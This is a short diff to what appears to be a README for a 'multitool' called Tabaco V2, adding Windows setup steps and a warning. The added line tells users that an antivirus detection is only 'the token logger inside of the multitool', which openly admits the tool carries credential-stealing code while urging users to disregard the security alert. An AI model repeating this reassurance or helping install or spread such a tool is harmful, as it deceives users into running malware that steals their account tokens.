@@ -17,6 +17,8 @@
 
 How to run Windows
 
+WARNING if it comes up as a virus its not its the token logger inside of the multitool that u can use 
+
 1 Go in the directory of Tabaco V2
 
 2 Locate the SETUP.bat "Dont Run Start.bat first it wont work"
